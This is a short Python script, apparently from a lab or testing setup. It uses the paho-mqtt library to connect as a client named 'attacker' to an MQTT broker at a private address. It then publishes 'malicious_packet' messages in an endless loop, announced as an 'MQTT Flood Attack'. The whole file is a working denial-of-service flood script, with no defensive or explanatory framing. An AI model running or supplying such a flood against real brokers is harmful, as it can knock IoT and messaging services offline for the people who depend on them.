import paho.mqtt.client as mqtt

BROKER="10.0.0.3"

client=mqtt.Client("attacker")
client.connect(BROKER,1883)

print("Starting MQTT Flood Attack")

while True:
    client.publish("attack/flood","malicious_packet")

